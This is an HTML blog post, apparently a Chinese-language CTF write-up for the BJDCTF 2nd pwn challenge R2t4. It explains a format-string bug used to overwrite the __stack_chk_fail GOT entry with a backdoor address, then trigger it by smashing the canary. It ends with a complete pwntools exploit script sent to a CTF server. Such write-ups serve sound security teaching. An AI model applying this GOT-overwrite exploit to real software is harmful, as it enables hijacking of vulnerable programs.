@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>BJDCTF 2nd Pwn R2t4 | NiceSeven&#39;s Website</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <link rel="stylesheet" href="/css/fonts.css" />
+    
+  </head>
+
+  <body>
+    <nav>
+    <ul class="menu">
+      
+      <li><a href="/">Home</a></li>
+      
+      <li><a href="/about/">About</a></li>
+      
+      <li><a href="/categories/">Categories</a></li>
+      
+      <li><a href="/tags/">Tags</a></li>
+      
+      <li><a href="/">Links</a></li>
+      
+    </ul>
+    <hr/>
+    </nav>
+
+<div class="article-meta">
+<h1><span class="title">BJDCTF 2nd Pwn R2t4</span></h1>
+<h2 class="author">NiceSeven</h2>
+<h2 class="date">2020/04/09</h2>
+</div>
+
+<main>
+<h1 id="bjdctf-2nd-pwn-r2t4">BJDCTF 2nd Pwn R2t4</h1>
+<p>考点:</p>
+<p>1、格式化字符串漏洞修改任意地址内容</p>
+<p>2、了解canary和__stack_chk_fail的工作原理</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200409163041232.png" alt="image-20200409163041232"></p>
+<p>64位，开启Canary所以需要leak出canary或者改写__stack_chk_fail等其他方法绕过</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200409162115275.png" alt="image-20200409162115275"></p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200409162604327.png" alt="image-20200409162604327"></p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200409162647789.png" alt="image-20200409162647789"></p>
+<p>存在后门（system(&ldquo;cat flag&quot;)），存在canary且只可以溢出8字节的数据不够形成rop链，所以无法直接通过栈溢出来cat flag，但是存在格式化字符串漏洞，可以利用此漏洞修改任意地址的内容</p>
+<p>利用格式化字符串漏洞需要知道我们的输入在栈中的偏移，才能使用$n来修改某个偏移位置的指针所指向地址的内容可以利用%p来测试</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200409164740041.png" alt="image-20200409164740041"></p>
+<p>这样我们就知道我们的第一个输入在栈中的偏移为6了，这样就可以构造格式化字符串来改写内容了，如下图栈偏移的9、10处覆盖为需要被修改内容的地址也就是指针，然后通过$n就能改写指针内容</p>
+<p>（%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置）</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200409162013690.png" alt="image-20200409162013690"></p>
+<p>上下两图栈地址不一样是因为我分开调试的，地址随机化造成的，但是偏移量不变对理解思路无影响</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200409171103613.png" alt="image-20200409171103613"></p>
+<p>利用格式化字符串漏洞修改任意地址的漏洞，将__stack_chk_fail@got执行的函数地址修改为system(&ldquo;cat flag&rdquo;)的地址，然后故意覆盖cannry(rbp+8)使执行__stack_chk_fail，这样在执行__stack_chk_fail的时候实际是执行system(&ldquo;cat flag&rdquo;)</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200409155353101.png" alt="image-20200409155353101"></p>
+<p>system(&ldquo;cat flag&quot;)的地址为0x00400626，因为是小端存储，所以我们需要将高字节写入高地址，低字节写入低地址，也是就将0x0040写入0x601018+2的地址，0x0626写入0x601018，这样系统再读0x601018的内容时也就识别为0x00400626，</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200409161709981.png" alt="image-20200409161709981">这里exp使用的$hn表示是以2个字节写入，一次写入2字节，当然也可以选择一次写入4、8字节但是这样可能会导致程序崩溃，所以具体多少字节的写入要看具体情况（%$hhn表示写入的地址空间为1字节，$n表示写入的地址空间为4字节，%$lln表示写入的地址空间为8字节）</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
+<span style="color:#75715e">#-*- coding=UTF-8 -*-</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">debug</span><span style="color:#e6db74">&#39;</span>
+<span style="color:#75715e">#sh = process(&#39;./r2t4&#39;)</span>
+sh <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">node3.buuoj.cn</span><span style="color:#e6db74">&#39;</span>,<span style="color:#ae81ff">28578</span>)
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./r2t4</span><span style="color:#e6db74">&#39;</span>)
+<span style="color:#75715e">#gdb.attach(sh)</span>
+__stack_chk_fail <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">__stack_chk_fail</span><span style="color:#e6db74">&#39;</span>]
+<span style="color:#66d9ef">print</span> hex(__stack_chk_fail)
+<span style="color:#75715e">#%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置</span>
+<span style="color:#75715e">#%c：输出字符，配上%n可用于向指定地址写数据</span>
+<span style="color:#75715e">#这里payload的意思是将64以双字节(%hn)的形式赋给栈偏移为9的指针，将64+1510也是以双字节的形式赋给栈偏移为10的指针</span>
+<span style="color:#75715e">#当然这里是使用16进制来赋值，64的16进制为0x0040，64+1510的16进制为0x0626</span>
+<span style="color:#75715e">#最后两个p64是为了将栈偏移处覆盖为我们需要的修改的指针，如上图的栈内容</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%64c</span><span style="color:#e6db74">%</span><span style="color:#e6db74">9$hn</span><span style="color:#e6db74">%1510c</span><span style="color:#e6db74">%</span><span style="color:#e6db74">10$hnAAA</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> p64(__stack_chk_fail<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>) <span style="color:#f92672">+</span> p64(__stack_chk_fail)
+<span style="color:#75715e">#pause()</span>
+sh<span style="color:#f92672">.</span>sendline(payload)
+sh<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200409162947159.png" alt="image-20200409162947159"></p>
+
+</main>
+
+  <footer>
+  
+  
+  <hr/>
+  © <a href="/">NiceSeven</a> 2017 &ndash; 2020 | <a href="https://github.com/NiceSeven">Github</a> |
+  
+  </footer>
+  </body>
+</html>
+
